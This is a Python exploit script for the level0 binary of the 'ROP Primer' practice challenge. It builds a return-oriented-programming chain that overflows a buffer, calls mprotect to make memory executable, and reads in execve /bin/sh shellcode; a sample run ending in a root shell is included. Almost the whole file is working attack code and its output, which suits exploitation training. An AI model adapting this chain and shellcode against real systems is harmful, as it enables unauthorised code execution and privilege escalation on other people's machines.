#!/usr/bin/env python

# https://blog.techorganic.com/2015/08/19/a-rop-primer-solution/
# https://g0blin.co.uk/rop-primer-0-2-vulnhub-writeup/
# http://rastamouse.me/writeups/2015/rop-primer-level-0/
# http://7rus7us.blogspot.com.au/2015/05/rop-primer-1_34.html
# http://barrebas.github.io/blog/2015/06/28/rop-primer-level0/

import struct

payload = ""

# find overwrite
buffer_before_eip_overwrite = "A" * 44

payload += buffer_before_eip_overwrite

# find mprotect
# gdb-peda$ p mprotect
# $1 = {<text variable, no debug info>} 0x80523e0 <mprotect>
mprotect = struct.pack("<I", 0x80523e0)

# find address to write to
# gdb-peda$ vmmap
# Start      End        Perm	Name
# 0x08048000 0x080ca000 r-xp	/home/home/code/offsec/binary_exploitation/examples/ropprimer/level0/level0
# 0x080ca000 0x080cb000 rw-p	/home/home/code/offsec/binary_exploitation/examples/ropprimer/level0/level0
# 0x080cb000 0x080ef000 rw-p	[heap]
# 0xf7ff9000 0xf7ffb000 rw-p	mapped
# 0xf7ffb000 0xf7ffd000 r--p	[vvar]
# 0xf7ffd000 0xf7ffe000 r-xp	[vdso]
# 0xfffdd000 0xffffe000 rw-p	[stack]
address_to_write_to = struct.pack("<I", 0x080ca000)

# find read
# gdb-peda$ p read
# $2 = {<text variable, no debug info>} 0x80517f0 <read>
read = struct.pack("<I", 0x80517f0)

# search for ropgadget to clean stack after first rop
# gdb-peda$ ropgadget
# ret = 0x8048106
# addesp_4 = 0x804a278
# popret = 0x8048550
# pop2ret = 0x8048883
# pop3ret = 0x8048882
pop3ret = struct.pack("<I", 0x8048882)

# use mprotect to set address_to_write_to region as executable
# int mprotect(void *addr, size_t len, int prot);
payload += mprotect
payload += pop3ret
payload += address_to_write_to
payload += struct.pack("<I", 0x200)
payload += struct.pack("<I", 0x7) # 0x7 = PROT_READ | PROT_WRITE | PROT_EXEC

# read shellcode in from stdin
# ssize_t read(int fd, void *buf, size_t count);
payload += read
payload += address_to_write_to
payload += struct.pack("<I", 0x0)
payload += address_to_write_to
payload += struct.pack("<I", 0x100)

# test that its reading from stdin and executing
# $ (python exploit.py; python -c 'print "\xcc\xcc"') | ./level0
# [+] ROP tutorial level0
# [+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Trace/breakpoint trap (core dumped)

# create shellcode
# gdb-peda$ shellcode generate x86/linux exec
# x86/linux/exec: 24 bytes
# shellcode = (
#     "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
#     "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
# )

#\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80

print payload

# run exploit
# $ (python exploit.py; python -c 'print "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x89\xca\x6a\x0b\x58\xcd\x80"'; cat) | ./level0
# [+] ROP tutorial level0
# [+] What's your name? [+] Bet you can't ROP me, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA���!
# whoami
# root


